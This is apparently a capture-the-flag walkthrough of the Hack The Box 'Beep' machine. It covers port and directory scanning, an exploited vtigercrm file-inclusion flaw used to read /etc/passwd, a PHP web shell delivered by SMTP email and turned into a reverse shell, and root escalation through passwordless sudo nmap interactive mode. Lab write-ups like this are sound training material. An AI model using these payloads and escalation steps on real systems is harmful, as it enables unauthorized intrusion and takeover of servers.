## Default Information
IP Address: 10.10.10.7\
OS: Linux

## Discovery

Firstly, let's add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.7    beep.htb
```
### Masscan

We will first off by scanning for open ports using masscan. Form the output, we realize that there are numerous open ports on this machine.

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.7 --rate=1000 -e tun0                 1 ⚙

Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-09-29 01:50:04 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 5038/tcp on 10.10.10.7                                    
Discovered open port 993/tcp on 10.10.10.7                                     
Discovered open port 443/tcp on 10.10.10.7                                     
Discovered open port 22/tcp on 10.10.10.7                                      
Discovered open port 111/tcp on 10.10.10.7                                     
Discovered open port 4559/tcp on 10.10.10.7                                    
Discovered open port 878/tcp on 10.10.10.7                                     
Discovered open port 3306/tcp on 10.10.10.7                                    
Discovered open port 4190/tcp on 10.10.10.7                                    
Discovered open port 143/tcp on 10.10.10.7                                     
Discovered open port 80/tcp on 10.10.10.7                                      
Discovered open port 10000/udp on 10.10.10.7                                   
Discovered open port 10000/tcp on 10.10.10.7                                   
Discovered open port 995/tcp on 10.10.10.7                                     
Discovered open port 25/tcp on 10.10.10.7                                      
Discovered open port 110/tcp on 10.10.10.7                                     
Discovered open port 4445/tcp on 10.10.10.7   
```

### Nmap
Next, we will scan these open ports using Nmap to identify the service behind each of these open ports.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| ssh | OpenSSH 4.3 (protocol 2.0) | Open |
| 25	| smtp | Postfix smtpd | Open |
| 80	| http | Apache httpd 2.2.3 | Open |
| 143	| imap | NIL | Open |
| 443	| SSL/https | NIL | Open |
| 878	| status | NIL | Open |
| 993	| imaps | NIL | Open |
| 995	| pop3s | NIL | Open |
| 3306	| mysql | MYSQL | Open |
| 5038	| asterisk | Asterisk Call Manager 1.1 | Open |
| 10000	| http | MiniServ 1.570 (Webmin httpd) | Open |

From the masscan, we notice that port 10000 is also a UDP port. However, the nmap scan of port 10000 does not turn up any interesting information about the UDP port.

### Gobuster
Afterwards, we will try to find the endpoints of https://beep.htb using Gobuster. From the output, we were able to find an interesting endpoint https://beep.htb/vtigercrm

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u https://beep.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://beep.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/29 05:52:41 Starting gobuster in directory enumeration mode
===============================================================
https://beep.htb/images               (Status: 301) [Size: 306] [--> https://beep.htb/images/]
https://beep.htb/help                 (Status: 301) [Size: 304] [--> https://beep.htb/help/]
https://beep.htb/themes               (Status: 301) [Size: 306] [--> https://beep.htb/themes/]
https://beep.htb/modules              (Status: 301) [Size: 307] [--> https://beep.htb/modules/]
https://beep.htb/mail                 (Status: 301) [Size: 304] [--> https://beep.htb/mail/] 
https://beep.htb/admin                (Status: 301) [Size: 305] [--> https://beep.htb/admin/] 
https://beep.htb/static               (Status: 301) [Size: 306] [--> https://beep.htb/static/] 
https://beep.htb/lang                 (Status: 301) [Size: 304] [--> https://beep.htb/lang/] 
https://beep.htb/panel                (Status: 301) [Size: 305] [--> https://beep.htb/panel/] 
https://beep.htb/libs                 (Status: 301) [Size: 304] [--> https://beep.htb/libs/] 
https://beep.htb/recordings           (Status: 301) [Size: 310] [--> https://beep.htb/recordings/]
https://beep.htb/vtigercrm            (Status: 301) [Size: 309] [--> https://beep.htb/vtigercrm/] 
```

Visitng https://beep.htb, we realize that the website uses PHP. Now, we will use gobuster to find for endpoints with PHP

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u https://beep.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://beep.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/29 06:10:23 Starting gobuster in directory enumeration mode
===============================================================
https://beep.htb/images               (Status: 301) [Size: 306] [--> https://beep.htb/images/]
https://beep.htb/help                 (Status: 301) [Size: 304] [--> https://beep.htb/help/]  
https://beep.htb/index.php            (Status: 200) [Size: 1785]    
https://beep.htb/register.php         (Status: 200) [Size: 1785]
https://beep.htb/themes               (Status: 301) [Size: 306] [--> https://beep.htb/themes/]
https://beep.htb/modules              (Status: 301) [Size: 307] [--> https://beep.htb/modules/]
https://beep.htb/mail                 (Status: 301) [Size: 304] [--> https://beep.htb/mail/]
https://beep.htb/admin                (Status: 301) [Size: 305] [--> https://beep.htb/admin/] 
https://beep.htb/static               (Status: 301) [Size: 306] [--> https://beep.htb/static/]
https://beep.htb/lang                 (Status: 301) [Size: 304] [--> https://beep.htb/lang/] 
https://beep.htb/config.php           (Status: 200) [Size: 1785]  
https://beep.htb/panel                (Status: 301) [Size: 305] [--> https://beep.htb/panel/] 
https://beep.htb/libs                 (Status: 301) [Size: 304] [--> https://beep.htb/libs/]
https://beep.htb/configs              (Status: 301) [Size: 307] [--> https://beep.htb/configs/] 
https://beep.htb/recordings           (Status: 301) [Size: 310] [--> https://beep.htb/recordings/]
```

## Exploit
### CVE-2012-4687
Next, we will visit https://beep.htb/vtigercrm and with some research, we realize that we can abuse the LFI from [CVE-2012-4687](https://www.exploit-db.com/exploits/18770). Afterwards, we will try to exploit LFI to RCE using ```/proc/self/fd/*``` but it failed. 

Using the LFI vulnerability, we can access the ```/proc/self/status``` that tells us the running process. From the output, we can find that a user with UID 100 and GID 101 is running the process in the background

![Viewing /proc/self/status](https://github.com/joelczk/writeups/blob/main/HTB/Images/Beep/proc_status.PNG)

Changing the LFI payload to ```/etc/passwd```, we are able to find that UID 100 and GID 101 is the user *asterisk*

![/etc/passwd file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Beep/etc_passwd.PNG)

### Reverse shell via SMTP
Recalling that we have an SMTP service at port 25, we will try to connect to the SMTP server and wait for the server banner. Notice that we are using ```beep.localdomain```

```
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.7 25 
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
220 beep.localdomain ESMTP Postfix
```
Next, we will identify ourselves to the server (We can use any random email addresses), and the server will return us the list of commands that we can use

```
EHLO test@test.com
250-beep.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
```

We will then move on to verify that the user *asterisk* exists on the SMTP server

```
VRFY asterisk@beep.localdomain
252 2.0.0 asterisk@beep.localdomain
```

Now, we will send an email to *asterisk@beep.localdomain* using the SMTP server

```
MAIL FROM:test@test.com
250 2.1.0 Ok
RCPT TO:asterisk@beep.localdomain
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Exploit
<?php echo system($_REQUEST['cmd']);?>

.
250 2.0.0 Ok: queued as DCBF1D92FD
```

Now, we will view the sent mail on ```/var/mail/asterisk```. However, we realize that there is no command execution yet.

![mail on asterisk](https://github.com/joelczk/writeups/blob/main/HTB/Images/Beep/mail.PNG)


Next, we will modify the payload to obtain a reverse shell.
![Reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Beep/rev_shell.PNG)

### Obtaining user flag
Now, we all we have to do is to obtain the user flag.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.7] 40702
bash: no job control in this shell
bash-3.2$ cd /home/fanis
bash-3.2$ cat user.txt
<Redacted user flag>
bash-3.2$ 
```

### Privilege Escalation to root

We will first look at the privileges that we have using ```sudo -l```. We realize that we can execute nmap with root privileges without password 

```
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

Next, we will use nmap to spawn a root shell and stabilize the root shell.

```
bash-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
sh: line 1: python3: command not found
/usr/bin/script -qc /bin/bash /dev/null
bash-3.2# export TERM=xterm
bash-3.2# stty cols 132 rows 34
```

### Obtaining root flag
All that is left for us to do is to obtain the root flag.

```
bash-3.2# cat /root/root.txt
<Redacted root flag>
```
